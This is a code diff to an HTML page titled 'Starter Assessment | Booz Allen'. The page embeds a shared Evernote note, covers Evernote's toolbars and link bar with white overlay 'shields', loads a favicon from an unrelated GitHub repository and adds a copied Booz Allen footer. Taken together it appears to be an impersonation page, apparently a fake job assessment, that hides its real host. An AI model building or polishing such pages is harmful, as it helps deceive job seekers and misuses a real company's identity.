@@ -8,6 +8,9 @@
     <title>Starter Assessment | Booz Allen</title>
     <link rel="icon" href="https://raw.githubusercontent.com/xwzwx/veloc-assets/refs/heads/main/booz-allen.png">
     
+    <!-- IMPORT THE EXACT "INTER" FONT -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+    
     <style>
         /* Setup body as a flex container */
         html, body {
@@ -24,7 +27,7 @@
         /* === 1. CUSTOM BLUE BANNER === */
         .title-banner {
             background-color: #23d2d7; 
-            color: #000; 
+            color: #000000; 
             padding: 16px 20px;
             font-size: 22px;
             font-weight: bold;
@@ -47,8 +50,6 @@
         }
 
         /* === 3. OVERLAYS (THE SHIELDS) === */
-        
-        /* SHIELD 1: Solid White to HIDE the top toolbars */
         .tools-hider {
             position: absolute;
             top: 0;
@@ -59,32 +60,162 @@
             background-color: #ffffff; 
         }
 
-        /* SHIELD 2: Transparent to PROTECT the title and subtitle */
         .title-protector {
             position: absolute;
             top: 180px; 
             left: 0;
             width: 100%;
-            
-            /* INCREASED HEIGHT to 150px to cover "Here we go!" */
             height: 150px; 
-            
             z-index: 50; 
             background-color: transparent; 
         }
 
-        /* SHIELD 3: Solid White to HIDE the right-side link bar */
         .right-hider {
             position: absolute;
             top: 0;
-            right: 0; /* Sticks it to the right edge */
-            
-            /* WIDTH CONTROL: 80px should perfectly cover the buttons. */
+            right: 0; 
             width: 80px; 
-            height: 100%; /* Stretches top to bottom */
-            
+            height: 100%; 
             z-index: 50; 
-            background-color: #ffffff; /* Solid white so links vanish */
+            background-color: #ffffff; 
+        }
+
+        /* === 4. HIGHLY OPTIMIZED MEGA-FOOTER === */
+        .booz-footer {
+            font-family: 'Inter', Calibri, Geneva, sans-serif;
+            background-color: #000000; 
+            color: #ffffff; 
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Top Subscribe & Social Bar */
+        .subscribe-bar {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 18px 40px; 
+            border-bottom: 1px solid #222222; 
+        }
+
+        .subscribe-center {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .subscribe-text {
+            color: #23d2d7;
+            font-weight: 700;
+            font-size: 16px;
+        }
+
+        .subscribe-btn {
+            background-color: #23d2d7;
+            color: #000000;
+            text-decoration: none;
+            padding: 10px 20px;
+            font-weight: 700;
+            font-size: 14px;
+            display: inline-block;
+            transition: background-color 0.2s;
+        }
+
+        .subscribe-btn:hover {
+            background-color: #1ebbc0;
+        }
+
+        /* Right-Aligned Social Icons */
+        .social-links {
+            position: absolute;
+            right: 40px;
+            display: flex;
+            gap: 15px;
+        }
+
+        .social-icon {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 34px;
+            height: 34px;
+            border: 1.5px solid #ffffff;
+            border-radius: 50%;
+            color: #ffffff;
+            text-decoration: none;
+            transition: border-color 0.2s, color 0.2s;
+        }
+
+        .social-icon svg {
+            width: 16px;
+            height: 16px;
+            fill: currentColor;
+        }
+
+        .social-icon:hover {
+            border-color: #c0c0c0;
+            color: #c0c0c0;
+        }
+
+        /* Link Grid Section */
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 15px;
+            padding: 24px 40px; 
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .footer-col h4 {
+            font-size: 14px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #ffffff;
+            margin: 0 0 4px 0; 
+            letter-spacing: 0.2px;
+        }
+
+        .footer-col a {
+            display: block;
+            /* Exact match from your web inspector screenshot */
+            color: #d9d9d9; 
+            font-size: 14px; 
+            padding: 8px 0px; 
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-col a:hover {
+            /* Exact match from your web inspector screenshot */
+            color: #c0c0c0;
+        }
+
+        /* Bottom Copyright Section */
+        .footer-bottom {
+            border-top: 1px solid #222222; 
+            text-align: center;
+            padding: 16px 20px;
+            font-size: 11px;
+            color: #d9d9d9;
+        }
+
+        /* === RESPONSIVE MOBILE FIX === */
+        @media screen and (max-width: 900px) {
+            .footer-grid {
+                display: none; 
+            }
+            .subscribe-bar {
+                flex-direction: column;
+                gap: 20px;
+            }
+            .social-links {
+                position: static; /* Centers icons under button on phones */
+            }
         }
     </style>
 </head>
@@ -98,19 +229,87 @@
     <!-- === IFRAME & OVERLAY WRAPPER === -->
     <div class="iframe-wrapper">
         
-        <!-- Top Shield (White / Hides Tools) -->
         <div class="tools-hider"></div>
-
-        <!-- Bottom Shield (Transparent / Protects Title & Subtitle) -->
         <div class="title-protector"></div>
-
-        <!-- Right Shield (White / Hides Link Bar) -->
         <div class="right-hider"></div>
 
         <!-- The Evernote Document -->
         <iframe src="https://share.evernote.com/note/0d33723a-a195-7f1d-41e8-d7ef12a8729e">
         </iframe>
 
+    </div>
+
+    <!-- === AUTHENTIC BOOZ ALLEN FOOTER === -->
+    <div class="booz-footer">
+        
+        <!-- Subscribe & Social Bar -->
+        <div class="subscribe-bar">
+            
+            <div class="subscribe-center">
+                <div class="subscribe-text">Stay Connected with Booz Allen</div>
+                <a class="subscribe-btn" href="https://pages.boozallen.com/preference-center.html" target="_blank">Subscribe</a>
+            </div>
+
+            <!-- Round Social Icons -->
+            <div class="social-links">
+                <a href="https://www.linkedin.com/company/booz-allen-hamilton" target="_blank" class="social-icon" aria-label="LinkedIn">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z"/>
+                    </svg>
+                </a>
+                <a href="https://x.com/BoozAllen" target="_blank" class="social-icon" aria-label="X (Twitter)">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/>
+                    </svg>
+                </a>
+            </div>
+
+        </div>
+
+        <!-- OPTIMIZED Link Grid (Max 4 items per column) -->
+        <div class="footer-grid">
+            <div class="footer-col">
+                <h4>INFORMATION FOR</h4>
+                <a href="https://access.bah.com/">Employees</a>
+                <a href="https://investors.boozallen.com/">Investors</a>
+                <a href="https://www.boozallen.com/menu/government-contract-vehicles.html">Contract Officers</a>
+                <a href="https://www.boozallen.com/menu/suppliers-and-small-businesses.html">Suppliers</a>
+            </div>
+            <div class="footer-col">
+                <h4>INDUSTRIES</h4>
+                <a href="https://www.boozallen.com/markets/civil-government.html">Government & Civil Agencies</a>
+                <a href="https://www.boozallen.com/markets/intelligence.html">Intelligence</a>
+                <a href="https://www.boozallen.com/markets/health.html">Life Sciences & Healthcare</a>
+                <a href="https://www.boozallen.com/markets/defense.html">Military</a>
+            </div>
+            <div class="footer-col">
+                <h4>FEATURED SOLUTIONS</h4>
+                <a href="https://www.boozallen.com/expertise/artificial-intelligence.html">Artificial Intelligence (AI)</a>
+                <a href="https://www.boozallen.com/expertise/digital-solutions/cloud-solutions.html">Cloud</a>
+                <a href="https://www.boozallen.com/s/solution/a-solution-for-enterprise-scale-devsecops.html">Enterprise DevSecOps</a>
+                <a href="https://www.boozallen.com/expertise/cybersecurity.html">Security</a>
+            </div>
+            <div class="footer-col">
+                <h4>ABOUT US</h4>
+                <a href="https://www.boozallen.com/about.html">About Us</a>
+                <a href="https://www.boozallen.com/about/empowering-our-people.html">Who We Are</a>
+                <a href="https://www.boozallen.com/expertise.html">What We Do</a>
+                <a href="https://www.boozallen.com/careers.html">Join Our Team</a>
+            </div>
+            <div class="footer-col">
+                <h4>SITE LINKS</h4>
+                <a href="https://www.boozallen.com/tools/footer-navigation/contact-us.html">Contact Us</a>
+                <a href="https://www.boozallen.com/tools/footer-navigation/privacy-policy.html">Privacy Statement</a>
+                <a href="https://www.boozallen.com/tools/footer-navigation/terms-of-use.html">Terms of Use</a>
+                <a href="https://www.boozallen.com/tools/footer-navigation/cookie-policy.html">Cookie Policy</a>
+            </div>
+        </div>
+
+        <!-- Copyright Line -->
+        <div class="footer-bottom">
+            &copy; 2026 Booz Allen Hamilton Inc. All Rights Reserved.
+        </div>
+        
     </div>
     
 </body>
